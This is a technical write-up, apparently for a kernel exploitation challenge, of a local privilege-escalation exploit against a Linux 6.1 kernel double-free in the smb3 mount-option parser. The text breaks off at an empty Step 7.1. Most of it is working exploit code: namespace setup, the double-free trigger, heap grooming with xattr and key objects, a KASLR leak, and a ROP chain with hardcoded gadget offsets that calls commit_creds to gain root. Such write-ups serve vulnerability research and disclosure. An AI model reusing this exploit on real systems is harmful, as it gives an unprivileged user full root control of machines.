Exploit Details
===============

In the following, I explain the exploitation process to get flag on LTS-6.1.52 instance.

# Summary

At a high level the exploit performs the following:

- Build a double-free primitive. Both the first free and the second free can be triggered anytime i want. Target slabs range from: kmalloc-8 -> kmalloc-256. This primitive can be triggered multiple times.
- Leak `struct shm_file_data` object which contains pointer to `shmem_vm_ops`. This allow me to bypass KASLR.
- Use `struct simple_xattr` object to store both rop chain and a fake `struct file_operations` object which only `llseek` pointer set. This `llseek` pointer will point to stack pivot gadget. Leak this `struct simple_xattr` object address.
- Use `struct simple_xattr` object to store fake `struct file` object. This `struct file` object has `f_op` set to the fake `struct file_operations` object's address from last step.
- Overwrite `struct ovl_dir_file` object which `realfile` set to the fake `struct file` object's address from last step.
- Trigger llseek to achieve stack pivot and run rop chain.

# Step in detail

## Step1: Initialization for exploit

Before triggering the vulnerability, the exploit takes the following steps:
  1. Save cs, ss, rsp, rflags registers.
  2. Setup namespaces and mount useful filesystems.
  3. Pinning the CPU.

### Step1.1: Save cs, ss, rsp, rflags registers
- [exploit.c#L886](./exploit.c#L886):

```c
save_state();
```

- [exploit.c#L140](./exploit.c#L140):

```c
void save_state(void)
{
  __asm__(
    ".intel_syntax noprefix;"
    "mov user_cs, cs;"
    "mov user_ss, ss;"
    "mov user_rsp, rsp;"
    "pushf;"
    "pop user_rflags;"
    ".att_syntax;"
  );
}
```
These registers value will be used to return to userspace from rop chain.

### Step1.2: Setup namespaces and mount userful filesystems
- [exploit.c#L887](./exploit.c#L887):

```c
if (!setup_namespace())
  return EXIT_FAILURE;
```

- [exploit.c#L528](./exploit.c#L528):

```c
bool setup_namespace(void)
{
  int real_uid = getuid();
  int real_gid = getgid();

  if (unshare(CLONE_NEWUSER | CLONE_NEWNS | CLONE_NEWIPC) < 0) {
    perror("unshare(CLONE_NEWUSER | CLONE_NEWNS | CLONE_NEWIPC)");
    return false;
  }

  if (!write_to_file("/proc/self/setgroups", "deny"))
    return false;

  if (!write_to_file("/proc/self/uid_map", "0 %d 1\n", real_uid))
    return false;

  if (!write_to_file("/proc/self/gid_map", "0 %d 1\n", real_gid))
    return false;

  mkdir(TMPFS_MOUNT_POINT, 0644);
  if (mount("none", TMPFS_MOUNT_POINT, "tmpfs", 0, NULL) < 0) {
    fprintf(stderr, "mount %s(type: tmpfs): %s\n", TMPFS_MOUNT_POINT, strerror(errno));
    return false;
  }

  mkdir(OVERLAYFS_MOUNT_POINT, 0644);
  mkdir(OVERLAYFS_LOWER_DIR_1, 0644);
  mkdir(OVERLAYFS_LOWER_DIR_2, 0644);

  char overlayfs_mount_options[512];
  snprintf(overlayfs_mount_options, sizeof(overlayfs_mount_options), "lowerdir=%s:%s",
    OVERLAYFS_LOWER_DIR_1, OVERLAYFS_LOWER_DIR_2);

  if (mount("overlay", OVERLAYFS_MOUNT_POINT, "overlay", 0, overlayfs_mount_options) < 0) {
    fprintf(stderr, "mount %s(type: overlayfs): %s\n", OVERLAYFS_MOUNT_POINT, strerror(errno));
    return false;
  }

  return true;
}
```

- Create and enter user/mount namespace with unshare syscall. This is necessary to trigger the vulnerability of the smbfs subsystem as an unprivileged user and mount useful filesystem.
- Create IPC namespace. This is necessary to allocate more `struct shm_file_data` objects in jail.
- Mount tmpfs filesystem which can be used to allocate `struct simple_xattr` object.
- Mount overlayfs filesystem which can be used to allocate `struct ovl_dir_file` object.

### Step1.3: Pinning the CPU
- [exploit.c#L890](./exploit.c#L890):

```c
if (!pin_on_cpu(0))
  return EXIT_FAILURE;
```

- [exploit.c#L491](./exploit.c#L491):

```c
bool pin_on_cpu(int core_id)
{
  cpu_set_t cpuset;
  CPU_ZERO(&cpuset);
  CPU_SET(core_id, &cpuset);
  if (sched_setaffinity(0, sizeof(cpu_set_t), &cpuset) < 0) {
    fprintf(stderr, "pin_on_cpu failed: %s\n", strerror(errno));
    return false;
  }

  return true;
}
```

- Pinning the current task into CPU core 0 with `sched_setaffinity` syscall. This is to maintain the exploit context in the same core to utilize percpu slab cache and freelist.

## Step2: Build double free primitive
The primitive can be built by splitting the process to three steps:
  1. Allocate vulnerable object.
  2. Free vulnerable object the first time.
  3. Free vulnerable object the second time.

### Step2.1: Allocate vulnerable object
- Exploit code [exploit.c#L569](./exploit.c#L569): 

```c
int prepare_double_free(int kmalloc_size)
{ 
  if (kmalloc_size <= 0 || kmalloc_size > 256)
    return -1;
  
  int fsfd = syscall(SYS_fsopen, "smb3", 0);
  if (fsfd < 0) {
    fprintf(stderr, "fsopen(smb3) failed: %s\n", strerror(errno));
    return -1;
  }

  char password[256];
  memset(password, 0x1, kmalloc_size - 1);
  password[kmalloc_size-1] = 0;
  if (syscall(SYS_fsconfig, fsfd, FSCONFIG_SET_STRING, "password", password, 0) < 0) {
    perror("fsconfig(FSCONFIG_SET_STRING)");
    close(fsfd);
    return -1;
  }

  return fsfd;
}
```

- Kernel code:

```c
static int smb3_fs_context_parse_param(struct fs_context *fc,
				      struct fs_parameter *param)
{
  ...
  switch (opt) {
  case Opt_pass:
    ...

		ctx->password = kstrdup(param->string, GFP_KERNEL);
		if (ctx->password == NULL) {
			cifs_errorf(fc, "OOM when copying password string\n");
			goto cifs_parse_mount_err;
		}
		break;
  ...
}              
```

- This step allocate `ctx->password` which is vulnerable object.

### Step2.2: Free vulnerable object the first time
- Exploit code [exploit.c#L592](./exploit.c#L592):

```c
static inline void trigger_first_free(int fsfd)
{
  syscall(SYS_fsconfig, fsfd, FSCONFIG_SET_STRING, "max_credits", "19", 0);
}
```

- Kernel code:

```c
static int smb3_fs_context_parse_param(struct fs_context *fc,
				      struct fs_parameter *param)
{
  ...
  switch (opt) {
  ...

  case Opt_max_credits:
		if (result.uint_32 < 20 || result.uint_32 > 60000) {
			cifs_errorf(fc, "%s: Invalid max_credits value\n",
				 __func__);
			goto cifs_parse_mount_err;
		}

  ...
  }
  ...
 cifs_parse_mount_err:
	kfree_sensitive(ctx->password);
	return -EINVAL;
}              
```

### Step2.3: Free vulnerable object the second time
- Exploit code [exploit.c#L597](./exploit.c#L597):

```c
static inline void trigger_second_free(int fsfd)
{
  close(fsfd);
}
```

- Kernel code:

```c
void
smb3_cleanup_fs_context_contents(struct smb3_fs_context *ctx)
{
  ...
	kfree_sensitive(ctx->password);
	ctx->password = NULL;
  ...
}
```

## Step3: Bypass KASLR
- [exploit.c#L893](./exploit.c#L893):

```c
kernel_base = leak_kernel_base();
printf("[+] kernel base: 0x%016lx\n", kernel_base);

init_task += kernel_base;
init_fs += kernel_base;
prepare_kernel_cred += kernel_base;
commit_creds += kernel_base;
find_task_by_vpid += kernel_base;
swapgs_restore_regs_and_return_to_usermode_nopop += kernel_base;
mov_rsp_rbp_pop_rbp_ret += kernel_base; 
pop_rdi_ret += kernel_base;
mov_rdi_rax_rep_ret += kernel_base;
pop_rsi_ret += kernel_base;
pop_rcx_ret += kernel_base;
mov_qword_ptr_rax_rsi_ret += kernel_base;
add_rax_rcx_ret += kernel_base;
```

- Offsets from kernel base [exploit.c#L42](./exploit.c#L42):

```c
uint64_t init_task = 0x2615a40;
uint64_t init_fs = 0x27b3de0;
uint64_t find_task_by_vpid = 0x1b64f0;
uint64_t prepare_kernel_cred = 0x1bfea0;
uint64_t commit_creds = 0x1bfc00;
uint64_t swapgs_restore_regs_and_return_to_usermode_nopop = 0x1201146;
uint64_t mov_rsp_rbp_pop_rbp_ret = 0x12de6c;
uint64_t pop_rdi_ret = 0xa61d8;
uint64_t pop_rsi_ret = 0x9b676;
uint64_t mov_rdi_rax_rep_ret = 0x117b93b;
uint64_t pop_rcx_ret = 0x37f1b3;
uint64_t mov_qword_ptr_rax_rsi_ret = 0x1e8ab3;
uint64_t add_rax_rcx_ret = 0xb13ccd;
```

The KASLR bypass process is implemented inside a loop which do the following steps:
  1. Prepare for `struct shm_file_data` objects allocation.
  2. Drain kmalloc-32.
  3. Try to overlap `struct user_key_payload` object and `struct shm_file_data` object.
  4. Leak heap with `struct user_key_payload` object.
  5. Search for `shmem_vm_ops` address.
  6. Cleanup and retry in case of failure.
  7. Calculate kernel base in case of success.

### Step3.1: Prepare for `struct shm_file_data` allocation
- [exploit.c#L614](./exploit.c#L614):

```c
int *shmids = prepare_shm_file_data_alloc(256);
```

- [exploit.c#L400](./exploit.c#L400):

```c
int *prepare_shm_file_data_alloc(int n)
{
  int *shmids = malloc(n * sizeof(*shmids));
  if (!shmids) {
    perror("malloc");
    return NULL;
  }

  for (int i = 0; i < n; i++) {
    shmids[i] = shmget(IPC_PRIVATE, 4096, IPC_CREAT);
    if (shmids[i] < 0) {
      perror("shmget");
      for (int j = i - 1; j >= 0; j--)
        shmctl(shmids[j], IPC_RMID, NULL); 

      free(shmids);
      return NULL;
    }
  }

  return shmids;
}
```

- Each identifier stored in shmids will be used to allocate `struct shm_file_data` object in the future.

### Step3.2: Drain kmalloc-32
- [exploit.c#L620](./exploit.c#L620):

```c
if (!drain_kmalloc_32(512))
  return 0;
```

- [exploit.c#L288](./exploit.c#L288):

```c
bool drain_kmalloc_32(int n)
{
  static bool first_time = true;
  static int obj_cnt = 0;
  
  if (first_time) {
    if (!create_file(DRAIN_KMALLOC_32_FILE_PATH))
      return false;

    first_time = false;
  }

  char payload[32] = {};
  char name[512] = {};
  
  for (int i = 0; i < n; i++) {
    snprintf(name, sizeof(name), "security.A%d", obj_cnt);
    if (setxattr(DRAIN_KMALLOC_32_FILE_PATH, name, payload, 0, 0) < 0) {
      fprintf(stderr, "setxattr(kmalloc_32) failed: %s\n", strerror(errno));
      return false;
    }

    obj_cnt++;
  }

  return true;
}
```

- Note: I think this step is unnecessary. Anyway, it don't cause any problem.

### Step3.3: Try to overlap `struct user_key_payload` object and `struct shm_file_data` object
- Free `struct user_key_payload` object [exploit.c#L623](./exploit.c#L623):

```c
df_fsfd = prepare_double_free(KMALLOC_32);
if (df_fsfd < 0)
  return 0;

get_full_timesplice();
trigger_first_free(df_fsfd);
read_kmalloc_32_key = user_key_payload_alloc("key32", "A", 1);
if (read_kmalloc_32_key < 0)
  return 0;

get_full_timesplice();
trigger_second_free(df_fsfd);
```

- [exploit.c#L448](./exploit.c#L448):
```c
key_serial_t user_key_payload_alloc(const char *desc, void *data, int n)
{
  key_serial_t key = add_key("user", desc, data, n, KEY_SPEC_USER_KEYRING);
  if (key < 0) {
    perror("add_key");
    return -1;
  }

  return key;
}
```

- Reclaim with `struct shm_file_data` object [exploit.c#L635](./exploit.c#L635):

```c
if (!shm_file_data_alloc(shmids, 256))
  return 0;
```

- [exploit.c#L423](./exploit.c#L423):

```c
bool shm_file_data_alloc(int *shmids, int n)
{
  for (int i = 0; i < n; i++) {
    if (!shmat(shmids[i], NULL, 0)) {
      perror("shmat");
      return false;
    }
  }

  return true;
}
```

### Step3.4: Leak heap with `struct user_key_payload` object
- [exploit.c#L638](./exploit.c#L638):

```c
if ((sz = user_key_payload_read(read_kmalloc_32_key, leak_buffer, sizeof(leak_buffer))) < 0)
  return 0;
```

- [exploit.c#L459](./exploit.c#L459):

```c
long user_key_payload_read(key_serial_t key, void *buf, int n)
{
  long ret = keyctl_read(key, buf, n);
  if (ret < 0) {
    perror("keyctl_read");
    return -1;
  }

  return ret;
}
```

### Step3.5: Search for `shmem_vm_ops` address
- [exploit.c#L641](./exploit.c#L641):

```c
shmem_vm_ops = search_shmem_vm_ops((uint64_t*)leak_buffer, sz / sizeof(uint64_t));
```

- [exploit.c#L602](./exploit.c#L602):

```c
uint64_t search_shmem_vm_ops(uint64_t *leak_data, int n)
{
  for (int i = 0; i < n; i++) 
    if ((leak_data[i] & 0x0FFFFF) == SHMEM_VM_OPS_LAST_20_BITS && (leak_data[i] >> 32) == 0xffffffff)
      return leak_data[i];

  return 0;
}
```

- [exploit.c#L35](./exploit.c#L35):

```c
#define SHMEM_VM_OPS_LAST_20_BITS 0x18600
```

### Step3.6: Cleanup and retry in case of failure
- [exploit.c#L645](./exploit.c#L645):

```c
if (!shm_file_data_free(shmids, 256))
  return 0;
```

- [exploit.c#L435](./exploit.c#L435):

```c
bool shm_file_data_free(int *shmids, int n)
{
  for (int i = 0; i < n; i++) {
    if (shmctl(shmids[i], IPC_RMID, NULL) < 0) {
      perror("shmctl");
      return false;
    }
  }

  free(shmids);
  return true;
}
```

- This step destroy all `struct shm_file_data` objects and System V shared memory segments.

### Step3.7: Calculate kernel base in case of success

- [exploit.c#L650](./exploit.c#L650):

```c
return shmem_vm_ops - SHMEM_VM_OPS_OFFSET_FROM_KERNEL_BASE;
```
- [exploit.c#L36](./exploit.c#L36):

```c
#define SHMEM_VM_OPS_OFFSET_FROM_KERNEL_BASE 0x1a18600
```

### Note:
- I forget to put step 3.1 implementation inside loop. This mistake will make the retry step fail and cause UAF too. The retry case never happen while running the exploit.

## Step4: Build primitive to leak two `struct simple_xattr` objects address
- I need two `struct simple_xattr` objects. One is used to store ropchain and a fake `struct file_operations` object. One is used to store a fake `struct file` object.
- Build a way to leak these 2 `struct simple_xattr` objects first. Then allocate its later.

- Kernel code:

```c
struct simple_xattr {
	struct list_head list;
	char *name;
	size_t size;
	char value[];
};
```

```c
int simple_xattr_set(struct simple_xattrs *xattrs, const char *name,
		     const void *value, size_t size, int flags,
		     ssize_t *removed_size)
{
	struct simple_xattr *xattr;
	struct simple_xattr *new_xattr = NULL;
	int err = 0;

	if (removed_size)
		*removed_size = -1;

	if (value) {
		new_xattr = simple_xattr_alloc(value, size); // `struct simple_xattr` object is allocated here.
		if (!new_xattr)
			return -ENOMEM;

		new_xattr->name = kstrdup(name, GFP_KERNEL);
		if (!new_xattr->name) {
			kvfree(new_xattr);
			return -ENOMEM;
		}
	}

	spin_lock(&xattrs->lock);
	list_for_each_entry(xattr, &xattrs->head, list) {
		if (!strcmp(name, xattr->name)) {
			if (flags & XATTR_CREATE) {
				xattr = new_xattr;
				err = -EEXIST;
			} else if (new_xattr) {
				list_replace(&xattr->list, &new_xattr->list);
				if (removed_size)
					*removed_size = xattr->size;
			} else {
				list_del(&xattr->list);
				if (removed_size)
					*removed_size = xattr->size;
			}
			goto out;
		}
	}
	if (flags & XATTR_REPLACE) {
		xattr = new_xattr;
		err = -ENODATA;
	} else {
		list_add(&new_xattr->list, &xattrs->head); // xattrs->head represent `struct simple_xattr` linked list of each file
		xattr = NULL;
	}
out:
	spin_unlock(&xattrs->lock);
	if (xattr) {
		kfree(xattr->name);
		kvfree(xattr);
	}
	return err;

}
```

```c
struct simple_xattr *simple_xattr_alloc(const void *value, size_t size)
{
  // value: payload passed from userspace
  // size: size of payload
	struct simple_xattr *new_xattr;
	size_t len;

	/* wrap around? */
	len = sizeof(*new_xattr) + size; // len = 32 + size
	if (len < sizeof(*new_xattr))
		return NULL;

	new_xattr = kvmalloc(len, GFP_KERNEL);
	if (!new_xattr)
		return NULL;

	new_xattr->size = size;
	memcpy(new_xattr->value, value, size);
	return new_xattr;
}
```

Some interesting things about `struct simple_xattr`:
- Can be allocated on kmalloc-32 -> kmalloc-8192.
- `value` field contain data copy from user.
- Each `struct simple_xattr` object allocated on the same file will be insert at the head of link list represented by `xattrs->head`. Read `list.prev` member of `struct simple_xattr` object will allow me to leak other `struct simple_xattr` object address.

I chose kmalloc-96 as target slab and perform the following steps:
  1. Drain kmalloc-96.
  2. Prepare and save data necessary for `struct simple_xattr` objects spray.
  3. Use the double free primitive to free `struct user_key_payload` object.
  4. Spray `struct simple_xattr` objects to reclaim `struct user_key_payload` object and fill all free slots in slab.
  5. Use `struct user_key_payload` object to leak heap.
  6. Search for at least 2 `struct simple_xattr` objects and save the results.

### Step4.1: Drain kmalloc-96
- [exploit.c#L689](./exploit#L689):

```c
drain_kmalloc_96(128)
```

- [exploit.c#L344](./exploit#L344):
```c
bool drain_kmalloc_96(int n)
{
  static bool first_time = true;
  static int obj_cnt = 0;

  if (first_time) {
    if (!create_file(DRAIN_KMALLOC_96_FILE_PATH))
      return false;

    first_time = false;
  }

  char payload[96] = {};
  char name[512] = {};

  for (int i = 0; i < n; i++) {
    snprintf(name, sizeof(name), "security.A%d", obj_cnt);
    if (setxattr(DRAIN_KMALLOC_96_FILE_PATH, name, payload, 64, 0) < 0) {
      fprintf(stderr, "setxattr(kmalloc_96) failed: %s\n", strerror(errno));
      return false;
    }

    obj_cnt++;
  }

  return true;
}
```

### Step4.2: Prepare and save data necessary for `struct simple_xattr` spray
- [exploit.c#L692](./exploit#L692):

```c
m = simple_xattr_manager_alloc(256);
if (!m)
  return 0;

for (int i = 0; i < 256; i++) {
  char path[512];
  snprintf(path, sizeof(path), "%s/%s_%d", TMPFS_MOUNT_POINT, "live_on_kmalloc_96", kmalloc96_obj_cnt);
  char name[512];
  snprintf(name, sizeof(name), "security.kmalloc96_%d", kmalloc96_obj_cnt);
  char payload[96]; 
  snprintf(payload, sizeof(payload), "%s_%d", pattern, kmalloc96_obj_cnt);
  if (!simple_xattr_manager_append(m, path, name, payload, payload_size))
    return 0;
  kmalloc96_obj_cnt++;
}
```

- The payload start with the same pattern and have a number at the end to make it unique per `struct simple_xattr` object. This way when leak heap, i can match `struct simple_xattr` object with userspace attribute data saved before.
- kmalloc-96 has 42 slots per slab, so spray 256 objects are kind of wasteful. Anyway, it still ok.

- [exploit.c#L182](./exploit.c#L182):

```c
struct simple_xattr_manager *simple_xattr_manager_alloc(int n)
{
  struct simple_xattr_manager *m = malloc(sizeof(*m));
  if (!m) {
    perror("malloc simple_xattr_manager");
    return NULL;
  }

  m->len = 0;
  m->max = n;
  m->attrs = calloc(n, sizeof(struct simple_xattr_attribute*));
  if (!m->attrs) {
    perror("calloc attrs storage"); 
    free(m);
    return NULL;
  }

  return m;
}
```

- [exploit.c#L125](./exploit.c#L125):

```c
struct simple_xattr_manager {
  int max;
  int len;
  struct simple_xattr_attribute **attrs;
};
```

- I use `struct simple_xattr_manager` object to store all data needed to spray `struct simple_xattr` objects.

- [exploit.c#L118](./exploit.c#L118):

```c
struct simple_xattr_attribute {
  char *path;
  char *name;
  char *payload;
  int size;
};
```

- `path`: file path to allocate `struct simple_xattr` object. Each file has its own linked list of `struct simple_xattr` objects.
- `name`: unique per `struct simple_xattr` object on that file path.
- `payload`: contain user data.
- `size`: size of payload.

- [exploit.c#L245](./exploit.c#L245):

```c
bool simple_xattr_manager_append(
  struct simple_xattr_manager *m,
  const char *path,
  const char *name,
  const char *payload,
  int size)
{
  if (m->len >= m->max)
    return false;

  if (!create_file(path))
    return false;

  struct simple_xattr_attribute *attr = simple_xattr_attribute_alloc(path, name, payload, size);
  if (!attr)
    return false;

  m->attrs[m->len++] = attr;
  return true;
}
```

- [exploit.c#L202](./exploit.c#L202):

```c
struct simple_xattr_attribute *simple_xattr_attribute_alloc(
  const char *path,
  const char *name,
  const char *payload,
  int size)
{
  struct simple_xattr_attribute *attr = malloc(sizeof(*attr));
  if (!attr) {
    fprintf(stderr, "malloc attr");
    return NULL;
  }

  attr->path = strdup(path);
  if (!attr->path) {
    fprintf(stderr, "strdup(%s): %s\n", path, strerror(errno));
    goto err;
  }

  attr->name = strdup(name);
  if (!attr->name) {
    fprintf(stderr, "strdup(%s): %s\n", name, strerror(errno));
    goto err1;
  }

  attr->payload = malloc(size);
  if (!attr->payload) {
    perror("malloc payload");
    goto err2;
  }

  attr->size = size;
  memcpy(attr->payload, payload, size);
  return attr;

err2:
  free(attr->name);
err1:
  free(attr->path);
err:
  free(attr);
  return NULL;
}
```

### Step4.3: Free `struct user_key_payload` object
- [exploit.c#L708](./exploit.c#L708):

```c
df_fsfd = prepare_double_free(KMALLOC_96);
if (df_fsfd < 0)
  return 0;

get_full_timesplice();
trigger_first_free(df_fsfd);
char tmp[41] = {};
read_kmalloc_96_key = user_key_payload_alloc("key96", tmp, 41);
if (read_kmalloc_96_key < 0)
  return 0;

get_full_timesplice();
trigger_second_free(df_fsfd);
```

### Step4.4: Spray `struct simple_xattr` objects
- [exploit.c#L722](./exploit.c#L722):

```c
if (!simple_xattr_manager_set(m))
  return 0;
```

- [exploit.c#L266](./exploit.c#L266):

```c
bool simple_xattr_manager_set(struct simple_xattr_manager *m)
{
  for (int i = 0; i < m->len; i++) {
    if (setxattr(m->attrs[i]->path, m->attrs[i]->name, m->attrs[i]->payload, m->attrs[i]->size, 0) < 0) {
      perror("setxattr");
      return false;
    }
  }

  return true;
}
```

- After this step, `struct user_key_payload` object is overlapped with `struct simple_xattr` object and other free slots in kmalloc-96 slab are filled with `struct simple_xattr` objects.

### Step4.5: Leak kmalloc-96 heap
- [exploit.c#L725](./exploit.c#L725):

```c
if ((leak_size = user_key_payload_read(read_kmalloc_96_key, leak_buffer, sizeof (leak_buffer))) < 0)
  return 0;
```

### Step4.6: Search for at least 2 `struct simple_xattr` objects and save the results
- [exploit.c#L728](./exploit.c#L728):

```c
leak_simple_xattrs = malloc(sizeof(*leak_simple_xattrs));
leak_simple_xattrs->attrs = calloc(m->len, sizeof(struct simple_xattr_attribute *)); 
leak_simple_xattrs->live_on_heap = KMALLOC_96;
leak_simple_xattrs->offsets_to_leak = calloc(m->len, sizeof(int));
leak_simple_xattrs->key_to_read = read_kmalloc_96_key;
leak_simple_xattrs->cnt = 0;
leak_simple_xattrs->size_to_read = leak_size;
```
- [exploit.c#L131](./exploit.c#L131):

```c
struct simple_xattr_leak_result {
  struct simple_xattr_attribute **attrs;
  int cnt;
  int live_on_heap;
  key_serial_t key_to_read;
  int size_to_read;
  int *offsets_to_leak;
};
```

- I use `leak_simple_xattrs` to store data needed to leak address of future allocated `struct simple_xattr`.
- `attrs` will be used to get the filename to allocate `struct simple_xattr` on.
- `live_on_heap`: the heap size i chose to leak.
- `key_to_read`: access victim `struct user_key_payload` object which the exploit use to leak heap.
- `offsets_to_leak`: save the offsets in leak buffer that represent the currently leaked `struct simple_xattr` objects.

- [exploit.c#L736](./exploit.c#L736):

```c
void *scan = skip_user_key_payload(leak_buffer, KMALLOC_96);
for (int i = 0; i < leak_size - USER_KEY_PAYLOAD_STRUCT_SIZE; i += SIMPLE_XATTR_STRUCT_SIZE) { // coding mistake. Should be `i += KMALLOC_96`. Luckily i define SIMPLE_XATTR_STRUCT_SIZE to 32, so eventually the exploit scan at the next kmalloc_96 object.
  struct simple_xattr *xattr = scan + i;
  if (is_data_look_like_simple_xattr(xattr, payload_size, pattern, strlen(pattern))) {
    //dump_simple_xattr(xattr);
    int x = simple_xattr_manager_lookup(m, xattr);
    if (x >= 0) {
      leak_simple_xattrs->attrs[leak_simple_xattrs->cnt] = m->attrs[x];
      leak_simple_xattrs->offsets_to_leak[leak_simple_xattrs->cnt] = i;
      leak_simple_xattrs->cnt++;
      if (leak_simple_xattrs->cnt >= 2)
        found_simple_xattr = true;
    }
  }
}
```

- [exploit.c#L653](./exploit.c#L653):

```c
bool is_data_look_like_simple_xattr(
  struct simple_xattr *xattr,
  int kmalloc_size,
  char *pattern,
  int pattern_size)
{
  if ((xattr->list.next >> 48) == 0xFFFF && (xattr->list.prev >> 48) == 0xFFFF &&
      (xattr->name >> 48) == 0xFFFF && xattr->size == kmalloc_size &&
      memcmp(xattr->value, pattern, pattern_size) == 0)
    return true;

  return false;
}
```

- [exploit.c#L278](./exploit.c#L278):

```c
int simple_xattr_manager_lookup(struct simple_xattr_manager *m, struct simple_xattr *xattr)
{
  for (int i = 0; i < m->len; i++)
    if (m->attrs[i]->size == xattr->size &&
        memcmp(m->attrs[i]->payload, xattr->value, xattr->size) == 0)
      return i;

  return -1;
}

```

- The exploit continue to search for data that look like `struct simple_xattr` object. In case `struct simple_xattr` object is found, save the attribute that is used to allocate that object and save the offset where that object is found in the leak buffer.
- From now on, I can allocate `struct simple_xattr` that have the payload i want on the same file that have `struct simple_xattr` object leaked. Then i leak the heap again and read the `list.prev` value to get the new allocated `struct simple_xattr` object address.

### Note:
- In case `struct user_key_payload` object is allocated at the first or second slot from the end of slab, the exploit can't find 2 `struct simple_xattr` objects. Anyway, the whole process can be repeat until the exploit found at least 2 `struct simple_xattr` objects.

## Step5: Create ropchain and a fake `struct file_operations` object

- [exploit.c#L911](./exploit.c#L911):

```c
uint64_t simple_xattr_kmalloc_8192_addr = prepare_rop_chain_and_fops_table(leak_simple_xattrs_on_kmalloc96);
```

- [exploit.c#L756](./exploit.c#L756):

```c
uint64_t prepare_rop_chain_and_fops_table(struct simple_xattr_leak_result *r)
{
  uint8_t buf[8192] = {};
  uint64_t *lseek = (uint64_t*)(&buf[0]);

  /* After the exploit get RIP control with lseek(int fd, off_t offset, int whence), RBP register have value equal to offset.
  So i set lseek to this stack pivot gadget:
    mov rsp, rbp
    pop rbp
    ret
  */
  *lseek = mov_rsp_rbp_pop_rbp_ret;

  /* Gadget reference:
  pop_rdi_ret: pop rdi; ret
  pop_rcx_ret: pop rcx; ret
  mov_rdi_rax_rep_ret: mov rdi, rax; rep [do some mov here i forgot to save]; ret
  add_rax_rcx_ret: add rax, rcx; ret
  pop_rsi_ret: pop rsi; ret
  mov_qword_ptr_rax_rsi_ret: mov qword ptr [rax], rsi; ret
  */
  uint64_t *rop = (uint64_t*)(&buf[2048]); // 2048 is fine. Avoid stack underflow and overwrite heap data when calling function in ROP gadget which sometime cause random crash.
  int idx = 0;
  rop[idx++] = 0; // dummy value for the `pop rbp` in stack pivot gadget describe above

  rop[idx++] = pop_rdi_ret; // RDI = &init_task
  rop[idx++] = init_task;
  rop[idx++] = prepare_kernel_cred; // prepare_kernel_cred(init_task). After this, RAX will point to `struct cred` represent root. I will call this `root_cred`.
  rop[idx++] = pop_rcx_ret; // RCX = 0
  rop[idx++] = 0;
  rop[idx++] = mov_rdi_rax_rep_ret; // RDI = root_cred
  rop[idx++] = commit_creds; // commit_creds(root_cred). After this, the exploit process have root permission.

  rop[idx++] = pop_rdi_ret; // RDI = exploit_process_pid
  rop[idx++] = getpid();
  rop[idx++] = find_task_by_vpid; // find_task_by_vpid(exploit_process_pid). After this, RAX will point to `struct task_struct` represent the exploit process. I will call this `task_struct` exploit_task
  rop[idx++] = pop_rcx_ret; // RCX = fs_offset_in_task_struct
  rop[idx++] = TASK_STRUCT_FS_OFFSET;
  rop[idx++] = add_rax_rcx_ret; // RAX = &(exploit_task->fs)
  rop[idx++] = pop_rsi_ret; // RSI = &init_fs
  rop[idx++] = init_fs;
  rop[idx++] = mov_qword_ptr_rax_rsi_ret; // exploit_task->fs = init_fs

  rop[idx++] = swapgs_restore_regs_and_return_to_usermode_nopop; // return to userspace.
  rop[idx++] = 0; // dummy
  rop[idx++] = 0; // dummy
  rop[idx++] = (uint64_t)win;
  rop[idx++] = user_cs;
  rop[idx++] = user_rflags;
  rop[idx++] = user_rsp & 0xffffffffffffff00;
  rop[idx++] = user_ss;

  // Allocate `struct simple_xattr` with `value` field contain ROP gadget and fake lseek address
  if (setxattr(r->attrs[0]->path, "security.lseek_rop", buf, KMALLOC_8192 - SIMPLE_XATTR_STRUCT_SIZE, 0) < 0) {
    perror("setxattr");
    return 0;
  }

  // Leak heap again from data saved in step 4
  char leak_buffer[USER_KEY_PAYLOAD_BUFFER_MAX];
  user_key_payload_read(r->key_to_read, leak_buffer, r->size_to_read);
  void *scan = skip_user_key_payload(leak_buffer, r->live_on_heap);

  // Read the `list.prev` value to get the address of `struct simple_xattr` that the exploit allocated in this step.
  struct simple_xattr *xattr = scan + r->offsets_to_leak[0];
  return xattr->list.prev;
}
```

- Bacause the exploit will eventually perform stack pivot to this heap, I pick kmalloc-8192 so the exploit can have a generous stack size.

## Step6: Calculate fops address and rop stack address
- Calculate fake fops address [exploit.c#L914](./exploit.c#L914):

```c
uint64_t fake_fops_addr = simple_xattr_kmalloc_8192_addr + SIMPLE_XATTR_STRUCT_SIZE - STRUCT_FILE_OPERATIONS_LLSEEK_OFFSET;
```
- [exploit.c#L27](./exploit.c#L27):

```c
#define SIMPLE_XATTR_STRUCT_SIZE 32
```
- [exploit.c#L39](./exploit.c#L39):

```c
#define STRUCT_FILE_OPERATIONS_LLSEEK_OFFSET 0x8
```

- Calculate rop stack address [exploit.c#L916](./exploit.c#L916):

```c
uint64_t rop_stack = simple_xattr_kmalloc_8192_addr + SIMPLE_XATTR_STRUCT_SIZE + 2048;
```

## Step7: Build fake `struct ovl_dir_file`

- Kernel code:

```c
static loff_t ovl_dir_llseek(struct file *file, loff_t offset, int origin)
{
	loff_t res;
	struct ovl_dir_file *od = file->private_data;

	inode_lock(file_inode(file));
	if (!file->f_pos)
		ovl_dir_reset(file);

	if (od->is_real) {
		res = vfs_llseek(od->realfile, offset, origin);
		file->f_pos = od->realfile->f_pos;
	} else {
		res = -EINVAL;

		switch (origin) {
		case SEEK_CUR:
			offset += file->f_pos;
			break;
		case SEEK_SET:
			break;
		default:
			goto out_unlock;
		}
		if (offset < 0)
			goto out_unlock;

		if (offset != file->f_pos) {
			file->f_pos = offset;
			if (od->cache)
				ovl_seek_cursor(od, offset);
		}
		res = offset;
	}
out_unlock:
	inode_unlock(file_inode(file));

	return res;
}
```

```c
loff_t vfs_llseek(struct file *file, loff_t offset, int whence)
{
	if (!(file->f_mode & FMODE_LSEEK))
		return -ESPIPE;
	return file->f_op->llseek(file, offset, whence);
}
```

```c
struct ovl_dir_file {
	bool is_real;
	bool is_upper;
	struct ovl_dir_cache *cache;
	struct list_head *cursor;
	struct file *realfile;
	struct file *upperfile;
};
```

- The idea is to fake `struct ovl_dir_file` object with `realfile` field set to a fake `struct file` object. This fake `struct file` object will have `f_op` field set to fake `struct file_operations` object that i created and leaked address from step5.
- Then when this line is reached: `vfs_llseek(od->realfile, offset, origin)`, i can get code execution.

Steps needed to build a fake `struct ovl_dir_file` object:
  1. Create a fake `struct file` object.
  2. Create `struct ovl_dir_file` object.
  3. Use double free primiive to fake `struct ovl_dir_file` object.

### Step7.1: Create a fake `struct file` object
